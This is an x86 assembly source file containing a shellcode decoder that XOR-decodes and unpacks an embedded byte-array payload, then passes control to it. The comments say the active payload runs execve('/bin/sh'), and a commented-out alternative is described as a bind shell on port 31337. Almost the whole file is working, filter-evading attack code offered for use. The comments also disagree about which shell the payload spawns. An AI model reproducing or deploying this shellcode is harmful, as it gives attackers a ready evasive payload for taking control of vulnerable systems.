; This is a simple shellcode of an encoded payload. The encoding is trivial/simple.
; The payload has been XORed and fixed with a particular set byte to mark
; invalid bytes. This decoder XORs the payload back and removes the 
; invalid bytes to form the final payload and pass the control to it.
; This is an execve("/bin/sh") shellcode(payload).
; 			--Vikrant Navalgund

BITS 32

%define XOR_KEY 0xee

section .text
	global _start
	_start:
		mov ecx, _plen
		xor eax, eax
		xor ebx, ebx
		mov bl, XOR_KEY
		jmp short _bridge
	_mixin:
		pop edi
		mov esi, edi
		pushad
	_decode:
		xor byte [edi], bl
		inc edi
		dec ecx
		jnz short _decode
		popad 				; Now esi and edi both point to the payload
	_fixup:
		inc edi
	_blitz:
		inc esi
		cmp byte [esi - 1], 0xaa
		jne short _swapbyte
		jmp short _blitz
	_continue:
		dec ecx
		jz short _undev
		jmp short _fixup
	
	_swapbyte:
		mov al, [esi - 1]
		mov [edi - 1], al
		jmp _continue
    _bridge:
		call _mixin

		; This is the execve(bin/bash) shellcode
		_undev: db 0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xdf,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x2e,0x5e,0x44,0xe5,0x44,0x5,0xfa,0x44,0xb0,0x67,0x1d,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xdf,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x27,0x66,0x44,0xa0,0x44,0xe9,0xbf,0x44,0xb8,0x67,0xf,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xdf,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x3c,0xbc,0x44,0x67,0x44,0xc,0x23,0x44,0x6e,0x2d,0x6,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x9,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x11,0x11,0x44,0x11,0x44,0xc1,0x8c,0x44,0x87,0x80,0xc1,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x9d,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x86,0x81,0x44,0x9e,0x44,0x9a

		; This is the port binding shellcode - port(31337)
		;_undev: db 0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x84,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x88,0xb6,0x44,0x77,0x44,0xdf,0x35,0x44,0xad,0xbc,0x84,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xef,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x84,0xec,0x44,0x67,0x44,0xf,0x23,0x44,0x6e,0x67,0x28,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xad,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x88,0x56,0x44,0x87,0x44,0x94,0x68,0x44,0xe,0xbc,0x88,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xbe,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x88,0xbd,0x44,0x67,0x44,0xf,0x84,0x44,0x88,0xb6,0x84,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xfe,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xbf,0xb8,0x44,0x67,0x44,0xf,0x23,0x44,0x6e,0x5e,0x88,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xad,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xad,0xbd,0x44,0xb8,0x44,0x67,0xf,0x44,0x23,0x6e,0x5e,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x88,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xad,0xbc,0x44,0xbc,0x44,0xb8,0x67,0x44,0xf,0x23,0x6e,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x67,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x2d,0xdf,0x44,0x27,0x44,0xdf,0x2e,0x44,0x5e,0xd1,0x23,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x6e,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xaf,0x6e,0x44,0x17,0x44,0xec,0x90,0x44,0x18,0x5e,0xe5,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xbc,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x86,0xc1,0x44,0xc1,0x44,0x9d,0x86,0x44,0x86,0xc1,0x8c,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x87,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x80,0x67,0x44,0xd,0x44,0xdf,0x27,0x44,0xbf,0x67,0xc,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0xbd,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x67,0xf,0x44,0x23,0x44,0x6e
		_plen: equ $-_undev

